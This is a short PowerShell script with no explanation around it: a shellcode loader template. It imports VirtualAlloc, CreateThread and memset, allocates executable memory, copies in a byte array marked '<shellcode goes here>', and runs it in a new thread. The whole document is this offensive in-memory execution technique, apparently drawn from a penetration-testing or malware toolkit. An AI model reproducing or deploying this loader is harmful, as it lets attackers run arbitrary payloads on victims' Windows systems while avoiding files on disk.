$c = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
';

$v2 = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]] $v1 = <shellcode goes here>;

$s = 0x1000;

if ($v1.Length -gt 0x1000) {$s = $v1.Length};

$x = $v2::VirtualAlloc(0,$s,0x3000,0x40);

for ($i=0;$i -le ($v1.Length - 1); $i++) {$v2::memset([IntPtr]($x.ToInt32() + $i), $v1[$i], 1)};

$v2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
